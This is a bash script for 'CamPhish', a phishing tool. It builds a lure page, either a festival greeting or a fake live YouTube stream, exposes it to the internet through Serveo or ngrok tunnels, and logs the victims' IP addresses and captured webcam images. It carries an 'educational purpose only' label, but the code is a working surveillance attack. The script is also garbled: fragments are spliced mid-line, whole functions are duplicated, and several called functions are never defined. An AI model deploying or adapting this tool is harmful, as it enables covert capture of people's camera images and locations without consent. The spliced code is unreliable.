#!/bin/bash
# CamPhish v2.0 - Updated for modern Serveo & unlimited captures
# Educational purpose only

trap 'printf "\n"; stop' 2

banner() {
    clear
    echo -e "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m"
    echo -e "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m"
    echo -e "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m"
    echo -e "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m"
    echo -e "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m"
    echo -e "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m"
    echo -e "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m"
    echo -e "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m"
    echo -e "\n\e[1;77m              Educational Purpose - Understand & Protect\e[0m\n"
}

stop() {
    pkill -f ngrok 2>/dev/null
    pkill -f php 2>/dev/null
    pkill -f ssh 2>/dev/null
    exit 1
}

get_serveo_link() {
    local attempt=0
    local max_attempts=12
    local link=""
    while [ $attempt -lt $max_attempts ]; do
        link=$(grep -oE 'https://[a-zA-Z0-9-]+\.(serveo\.net|serveousercontent\.com)' sendlink 2>/dev/null | head -1)
        if [ -n "$link" ]; then
            echo "$link"
            return 0
        fi
        link=$(grep -o 'https://[^ ]*' sendlink 2>/dev/null | head -1)
        if [ -n "$link" ]; then
            echo "$link"
            return 0
        fi
        sleep 1
        ((attempt++))
    done
    return 1
}

serveo_tunnel() {
    command -v ssh >/dev/null 2>&1 || { echo "ssh not installed"; exit 1; }
    echo -e "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo tunnel...\e[0m"
    rm -f sendlink
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net > sendlink 2>&1 &
    SSH_PID=$!
    echo -e "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Waiting for tunnel (10 sec)...\e[0m"
    sleep 10
    LINK=$(get_serveo_link)
    if [ -z "$LINK" ]; then
        echo -e "\e[1;91m[!] Failed to get link from Serveo.\e[0m"
        kill $SSH_PID 2>/dev/null
        exit 1
    fi
    echo -e "\e[1;92m[\e[0m+\e[1;92m] Direct link:\e[0m \e[1;97m$LINK\e[0m"
    echo "$LINK" > current_link.txt
}

start_php_server() {
    echo -e "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting PHP server on port 3333...\e[0m"
    fuser -k 3333/tcp 2>/dev/null
    php -S localhost:3333 > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2
    if ! kill -0 $PHP_PID 2>/dev/null; then
        echo -e "\e[1;91m[!] PHP server failed.\e[0m"
        exit 1
    fi
}

build_payload() {
    local link="$1"
    sed "s+forwarding_link+$link+g" template.php > index.php
    if [ "$option_tem" -eq 1 ]; then
        sed "s+forwarding_link+$link+g" festivalwishes.html > index3.html
        sed "s+fes_name+$fest_name+g" index3.html > index2.html
    else
        sed "s+forwarding_link+$link+g" LiveYTTV.html > index3.html
        sed "s+live_yt_tv+$yt_video_ID+g" index3.html > index2.html
    fi
    rm -f index3.html
    echo -e "\e[1;92m[+] Payload built. Waiting for targets...\e[0m"
}

monitor_captures() {
    echo -e "\e[1;93m[*] Monitoring for captures. Press Ctrl+C to stop.\e[0m\n"
    while true; do
        if [ -f "ip.txt" ]; then
            IP=$(grep -a 'IP:' ip.txt | cut -d ' ' -f2 | tr -d '\r')
            echo -e "\e[1;92m[+] New IP captured:\e[0m \e[1;77m$IP\e[0m"
            cat ip.txt >> saved_ips.txt
            rm -f ip.txt
        fi
        if [ -f "Log.log" ]; then
            TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
            mv Log.log "capture_$TIMESTAMP.log"
            echo -e "\e[1;92m[+] Image captured! Saved as capture_$TIMESTAMP.log\e[0m"
        fi
        sleep 1
    done
}

select_template() {
    echo -e "\n----- Choose a template -----"
    echo -e "\e[1;92m[01]\e[0m Festival Wishing"
    echo -e "\e[1;92m[02]\e[0m Live Youtube TV"
    read -p $'\n\e[1;92m[+] Choose template [1-2]: \e[0m' option_tem
    case $option_tem in
        1)
            read -p $'\e[1;92m[+] Enter festival name: \e[0m' fest_name
            fest_name="${fest_name// /}"
            ;;
        2)
            read -p $'\e[1;92m[+] Enter YouTube video ID: \e[0m' yt_video_ID
            ;;
        *)
            echo "Invalid, using default (1)"
            option_tem=1
            fest_name="HappyBirthday"
            ;;
    esac
}

main() {
    banner
    select_template
    rm -f capture_*.log saved_ips.txt ip.txt Log.log current_link.txt sendlink
    start_php_server
    serveo_tunnel
    LINK=$(cat current_link.txt)
    build_payload "$LINK"
    monitor_captures
}

mainif [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
fi
rm -rf index3.html
}

select_template() {
if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
sleep 1
clear
banner
camphish
else
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
else
printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
sleep 1
select_template
fi
fi
}

ngrok_server() {
if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi
else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

camphish() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n-----Choose tunnel server----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template
if [[ $option_server -eq 2 ]]; then
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start
elif [[ $option_server -eq 1 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
camphish
fi
}

payload() {
# send_link is already extracted in server() function
# Use the correct variable: send_link (global)
if [[ -z "$send_link" ]]; then
    printf "\e[1;93m[!] No link extracted. Please check your connection or try again.\e[0m\n"
    exit 1
fi

sed 's+forwarding_link+'$send_link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
    sed 's+forwarding_link+'$send_link'+g' festivalwishes.html > index3.html
    sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
else
    sed 's+forwarding_link+'$send_link'+g' LiveYTTV.html > index3.html
    sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
fi
rm -rf index3.html
}

start() {
default_choose_sub="Y"
default_subdomain="saycheese$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound
}

banner
dependencies
camphishif [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
else
printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
sleep 1
select_template
fi
fi
}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

camphish() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n-----Choose tunnel server----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template
if [[ $option_server -eq 2 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 1 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
camphish
fi

}


payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed 's+forwarding_link+'$send_link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
fi
rm -rf index3.html

}

start() {

default_choose_sub="Y"
default_subdomain="saycheese$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

banner
dependencies
camphish

